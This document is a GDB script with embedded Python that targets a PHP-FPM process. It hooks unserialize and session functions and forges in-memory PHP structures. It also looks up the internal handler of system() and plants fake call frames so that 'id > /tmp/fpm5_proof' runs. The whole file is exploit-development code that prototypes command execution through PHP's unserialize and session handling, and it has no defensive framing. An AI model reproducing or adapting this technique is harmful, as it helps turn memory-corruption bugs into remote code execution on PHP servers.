set pagination off
set confirm off
set breakpoint pending on
set follow-fork-mode child
set detach-on-fork on
set logging file /tmp/fpm-fire.log
set logging overwrite on
set logging enabled on
set $zif = 0
set $psaddr = 0

break php_var_unserialize_init
commands
silent
set $lvl = *(unsigned int*)((char*)&basic_globals+0x370)
set $d = *(void**)((char*)&basic_globals+0x368)
printf "INIT level=%u data=%p\n", $lvl, $d
if $lvl != 0 && $d != 0
  set *(void**)((char*)$d+0x08) = (char*)$d + 0x3000
  set *(void**)((char*)$d+0x10) = (char*)$d + 0x3000
  set *(long*)((char*)$d+0x3000) = 1
  set *(void**)((char*)$d+0x3008) = 0
  set *(void**)((char*)$d+0x3010) = (char*)$d + 0x3100
  set *(unsigned int*)((char*)$d+0x3018) = 0x107
  set *(unsigned int*)((char*)$d+0x301c) = 0
  set *(unsigned long*)((char*)$d+0x3100) = 0x0000000700000001
  set *(unsigned long*)((char*)$d+0x3108) = 0xfffffff800000010
  set *(void**)((char*)$d+0x3110) = (char*)$d + 0x3120
  set *(unsigned long*)((char*)$d+0x3118) = 0x0000000100000001
  set *(unsigned long*)((char*)$d+0x3120) = 8
python
import gdb
import traceback

def _find_zif():
    eg = int(gdb.parse_and_eval("&executor_globals"))
    print("EG %#x" % eg)
    inf = gdb.selected_inferior()
    def q(a):
        return int.from_bytes(inf.read_memory(a, 8), "little")
    ft = q(eg + 456)
    print("FT %#x" % ft)
    try:
        ps = int(gdb.parse_and_eval("&ps_globals"))
        gdb.execute("set $psaddr = (void*)%#x" % ps)
        z = ps + 0x168
        ref = q(z)
        ht = q(ref + 8)
        print("PS %#x Z %#x REF %#x HT %#x PD %#x" % (ps, z, ref, ht, q(ht + 0x30)))
    except Exception as e:
        print("PSERR %s" % e)
    try:
        zv = int(gdb.parse_and_eval("((void*(*)(void*, const char*, unsigned long))zend_hash_str_find)((void*)%#x, \"system\", 6)" % ft))
        print("ZV %#x" % zv)
        if zv:
            fn = q(zv)
            zif = q(fn + 0x58)
            print("ZIF_DIRECT fn=%#x zif=%#x" % (fn, zif))
            gdb.execute("set $zif = (void*)%#x" % zif)
            gdb.execute("set $fn = (void*)%#x" % fn)
            return True
    except Exception as e:
        print("DIRECTERR %s" % e)
    try:
        ar = q(ft + 0x10)
        n = int.from_bytes(inf.read_memory(ft + 0x18, 4), "little")
        print("AR %#x N %d" % (ar, n))
        if 0 < n < 20000:
            blob = bytes(inf.read_memory(ar, min(n, 20000) * 32))
            j = blob.find(b"system")
            if j != -1:
                print("FOUNDSTR off=%#x bucket=%d" % (j, j // 32))
            for i in range(min(n, 3)):
                b = ar + i * 32
                key = q(b + 24)
                try:
                    raw = bytes(inf.read_memory(key, 0x30))
                except Exception:
                    raw = b""
                print("B%d key=%#x raw=%s" % (i, key, raw.hex()))
            for i in range(n):
                b = ar + i * 32
                for ko in (8, 16, 24):
                    key = q(b + ko)
                    if key == 0:
                        continue
                    try:
                        ln = int.from_bytes(inf.read_memory(key + 0x10, 8), "little")
                        if ln != 6:
                            continue
                        if bytes(inf.read_memory(key + 0x18, 6)) != b"system":
                            continue
                        fn = q(b)
                        zif = q(fn + 0x58)
                        print("ZIF_SCAN bucket=%d ko=%d fn=%#x zif=%#x" % (i, ko, fn, zif))
                        gdb.execute("set $zif = (void*)%#x" % zif)
                        gdb.execute("set $fn = (void*)%#x" % fn)
                        return True
                    except Exception:
                        continue
    except Exception as e:
        print("SCANERR %s" % e)
    return False

if not _find_zif():
    print("ZIF_SCAN failed")
else:
    gdb.execute("set *(void**)((char*)$d+0x3130) = (void*)$zif")
end
  set *(unsigned int*)((char*)$d+0x314c) = 1
  set *(void**)((char*)$d+0x3170) = (char*)$d + 0x3180
  set *(unsigned int*)((char*)$d+0x3178) = 0x06
  set *(unsigned int*)((char*)$d+0x317c) = 0
  set *(unsigned long*)((char*)$d+0x3180) = 0x0000000600000001
  set *(unsigned long*)((char*)$d+0x3188) = 0
  set *(unsigned long*)((char*)$d+0x3190) = 22
  set {char[23]} ((char*)$d+0x3198) = "id > /tmp/fpm5_proof"
  printf "FIRE d=%p first=%p last=%p data0=%p array=%p\n", $d, *(void**)((char*)$d+0x08), *(void**)((char*)$d+0x10), *(void**)((char*)$d+0x3010), (char*)$d+0x3100
  x/8gx (char*)$d+0x3100
end
continue
end

python
import gdb

_ARM = [False]
_ZIF = [0]
_NS = [0]

def _inf():
    return gdb.selected_inferior()

def _q(a):
    return int.from_bytes(bytes(_inf().read_memory(a, 8)), "little")

def _wq(a, v):
    _inf().write_memory(a, int(v & 0xffffffffffffffff).to_bytes(8, "little"))

def _u(a):
    return int.from_bytes(bytes(_inf().read_memory(a, 4)), "little")

def _wu(a, v):
    _inf().write_memory(a, int(v & 0xffffffff).to_bytes(4, "little"))

class _Destroy(gdb.Breakpoint):
    def stop(self):
        try:
            ht = int(gdb.parse_and_eval("$rdi"))
            pd = _q(ht + 0x30)
            print("DEST ht=%#x pd=%#x zif=%#x" % (ht, pd, _ZIF[0]))
            if not _ZIF[0] or pd != _ZIF[0]:
                return False
            ar = _q(ht + 0x10)
            n = _u(ht + 0x18)
            print("MATCH ht=%#x ar=%#x n=%d" % (ht, ar, n))
            if not ar or not n:
                return False
            v = ar
            cmd = b"id > /tmp/fpm5_proof"
            st = v + 0x100
            _wq(v, _ZIF[0])
            _wq(v + 0x18, int(gdb.parse_and_eval("$fn")))
            _wu(v + 0x2c, 1)
            _wq(v + 0x50, st)
            _wu(v + 0x58, 6)
            _wq(st + 0x10, len(cmd))
            _inf().write_memory(st + 0x18, cmd)
            print("DESTROYF ht=%#x ar=%#x v=%#x n=%d zif=%#x q2c=%#x q50=%#x q58=%#x" % (
                ht, ar, v, n, _ZIF[0], _u(v+0x2c), _q(v+0x50), _q(v+0x58)))
        except Exception as e:
            print("DERR %s" % e)
        return False

class _Flush(gdb.Breakpoint):
    def stop(self):
        try:
            if not _ZIF[0]:
                return False
            ps = int(gdb.parse_and_eval("&ps_globals"))
            z = _q(ps + 0x168)
            if not z:
                return False
            ht = _q(z + 8)
            if not ht:
                return False
            _wq(ht + 0x30, _ZIF[0])
            ar = _q(ht + 0x10)
            n = _u(ht + 0x18)
            print("MATCH ht=%#x ar=%#x n=%d" % (ht, ar, n))
            if not ar or not n:
                return False
            v = ar
            cmd = b"id > /tmp/fpm5_proof"
            st = v + 0x100
            _wq(v + 0x18, int(gdb.parse_and_eval("$fn")))
            _wu(v + 0x2c, 1)
            _wq(v + 0x50, st)
            _wu(v + 0x58, 6)
            _wq(st + 0x10, len(cmd))
            _inf().write_memory(st + 0x18, cmd)
            print("FLUSH ht=%#x ar=%#x v=%#x n=%d zif=%#x" % (ht, ar, v, n, _ZIF[0]))
            _Sys("*%#x" % _ZIF[0], internal=True)
        except Exception as e:
            print("FERR %s" % e)
        return False

class _Wrong(gdb.Breakpoint):
    def stop(self):
        print("WRONG rdi=%#x rsi=%#x" % (int(gdb.parse_and_eval("$rdi")), int(gdb.parse_and_eval("$rsi"))))
        gdb.execute("bt 10")
        return False

class _Sys(gdb.Breakpoint):
    def stop(self):
        e = int(gdb.parse_and_eval("$rdi"))
        print("SYSE e=%#x opline=%#x call=%#x rv=%#x func=%#x q20=%#x q28=%#x q30=%#x na=%d arg0=%#x at=%d" % (
            e, _q(e), _q(e+8), _q(e+0x10), _q(e+0x18), _q(e+0x20), _q(e+0x28), _q(e+0x30), _u(e+0x2c), _q(e+0x50), _u(e+0x58)))
        return False

class _Sess(gdb.Breakpoint):
    def stop(self):
        _NS[0] += 1
        print("SESS n=%d" % _NS[0])
        return False

class _Tmp(gdb.Breakpoint):
    def stop(self):
        try:
            zif = int(gdb.parse_and_eval("$zif"))
            if zif == 0:
                return False
            vh = int(gdb.parse_and_eval("$rdi"))
            d = _q(vh)
            if not d:
                return False
            dt = _q(d + 0x10)
            if not dt:
                return False
            ps = int(gdb.parse_and_eval("&ps_globals"))
            z = _q(ps + 0x168)
            ht = _q(z + 8)
            tgt = ht + 0x30
            used = (tgt - dt - 16) // 16
            ar = _q(ht + 0x10)
            nu = _u(ht + 0x18)
            if _NS[0] >= 3:
                _ARM[0] = True
                print("TMPARM d=%#x dt=%#x used=%d ra=%#x" % (d, dt, used, _q(int(gdb.parse_and_eval("$rsp")))))
                print("BUCKETS ar=%#x n=%d" % (ar, nu))
                for _i in range(min(nu, 6)):
                    print("B%d val=%#x type=%d" % (_i, _q(ar + 32*_i), _u(ar + 32*_i + 12)))
                if nu:
                    _v = _q(ar)
                    print("FRAME val=%#x q0=%#x q8=%#x q10=%#x q20=%#x q28=%#x q2c=%#x q30=%#x q50=%#x q58=%#x" % (
                        _v, _q(_v), _q(_v+8), _q(_v+0x10), _q(_v+0x20), _q(_v+0x28),
                        _u(_v+0x2c), _q(_v+0x30), _q(_v+0x50), _q(_v+0x58)))
        except Exception as e:
            print("TMPERR %s" % e)
            traceback.print_exc()
        return False

class _Set(gdb.Breakpoint):
    def stop(self):
        try:
            zif = int(gdb.parse_and_eval("$zif"))
            if zif == 0:
                return False
            rv = int(gdb.parse_and_eval("$rsi"))
            cur = _q(rv)
            ra = _q(int(gdb.parse_and_eval("$rsp")))
            if cur:
                _ZIF[0] = zif
                print("SETSV rv=%#x cur=%#x zif=%#x ra=%#x" % (rv, cur, zif, ra))
        except Exception as e:
            print("SETERR %s" % e)
            traceback.print_exc()
        return False

_Wrong("zend_wrong_parameters_count_error", internal=True)
#_Flush("php_session_flush", internal=True)
_Destroy("zend_hash_destroy", internal=True)
_Sess("php_session_start", internal=True)
_Tmp("var_tmp_var", internal=True)
_Set("php_set_session_var", internal=True)
end

break php_var_unserialize_destroy
commands
silent
printf "DESTROY d=%p level=%u\n", (void**)$rdi, *(unsigned int*)((char*)&basic_globals+0x370)
continue
end

break _zend_bailout
commands
silent
set $d = *(void**)((char*)&basic_globals+0x368)
printf "BAILOUT level=%u d=%p\n", *(unsigned int*)((char*)&basic_globals+0x370), $d
bt 4
continue
end

run
printf "=== inferior stopped ===\n"
bt 8
info registers rip rdi rsi rdx rcx rax rbx rbp
